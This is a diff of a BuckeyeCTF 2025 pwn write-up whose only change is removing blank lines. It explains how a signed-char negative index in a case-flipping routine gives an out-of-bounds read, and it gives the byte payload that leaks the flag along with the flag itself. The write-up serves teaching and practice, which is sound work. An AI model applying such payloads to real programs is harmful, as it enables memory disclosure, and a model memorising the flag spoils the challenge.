@@ -6,24 +6,16 @@
 
 >
 
-
-
 ![img_1.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_1.png)
 tHe bEsT WaY To wIn aN ArGuMeNt iS To rEpEaT EvErYtHiNg tHe oThEr pErSoN SaYs lIkE ThIs
-
-
 
 ![img_2.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_2.png)
 ```
 ncat --ssl character-assassination.challs.pwnoh.io 1337
 ```
 
-
-
 ![img_3.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_3.png)
 This challenge gave us this source code
-
-
 
 ![img_4.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_4.png)
 ```
@@ -100,12 +92,8 @@ printf("\n");
 }
 ```
 
-
-
 ![img_10.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_10.png)
 As we can see, the challenge looks like safe from BoF, its also all protected with PIE, Canary etc. So, the bug is in this area
-
-
 
 ![img_11.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_11.png)
 ```
@@ -117,12 +105,8 @@ printf("%c", lower[c]);
 }
 ```
 
-
-
 ![img_12.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_12.png)
 Keep in mind, char on c only takes signed 8-bit integer (-128 to 127). So if we put char that ≥ 128, it wraps to -1 (Negative numbers). This can lead us to a Negative array indexing -> out of bounds read. Take a look at the defined code
-
-
 
 ![img_13.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_13.png)
 ```
@@ -141,62 +125,42 @@ char upper[] = {
 };
 ```
 
-
-
 ![img_14.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_14.png)
 The flag will be appear if we send a negative number on the array upper. So this is already clear, now let's find out what's best offset to read flag (64).
-
-
 
 ![img_15.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_15.png)
 ```
 127 + 64 = 191 + 1 (\x00) = 192 (0xc0)
 ```
 
-
-
 ![img_16.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_16.png)
 Now lets test the payload by confirm the format flag first. Keep in mind also, the flag will be appear on (i % 2), so put the target after any character (in this case I'm using “A”)
-
-
 
 ![img_17.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_17.png)
 ```
 payload = b"A\xc0A\xc1A\xc2A\xc3A\xc4
 ```
 
-
-
 ![img_18.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_18.png)
 ```
 abacatafa{
 ```
 
-
-
 ![img_19.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_19.png)
 Okay, it's confirmed work, now, lets craft it until the end of flag character “}”
-
-
 
 ![img_20.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_20.png)
 ```
 payload = b"A\xc0A\xc1A\xc2A\xc3A\xc4A\xc5A\xc6A\xc7A\xc8A\xc9A\xcaA\xcbA\xccA\xcdA\xceA\xcfA\xd0A\xd1A\xd2A\xd3A\xd4A\xd5A\xd6A\xd7A\xd8A\xd9A\xdaA\xdbA\xdcA\xddA\xdeA\xdf"
 ```
 
-
-
 ![img_21.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_21.png)
 ```
 abacatafa{awaOawa_aYaoaUa_asaOalaVaeaDa_aiaTa_a6a6a5afafa8a3ada}
 ```
 
-
-
 ![img_22.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_22.png)
 Now, just replace the “a” > “”
-
-
 
 ![img_23.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_23.png)
 ```
@@ -204,12 +168,8 @@ Now, just replace the “a” > “”
 'bctf{wOw_YoU_sOlVeD_iT_665ff83d}'
 ```
 
-
-
 ![img_24.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_24.png)
 Flag: bctf{wOw_YoU_sOlVeD_iT_665ff83d}
-
-
 
 ![img_25.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_25.png)
 ---
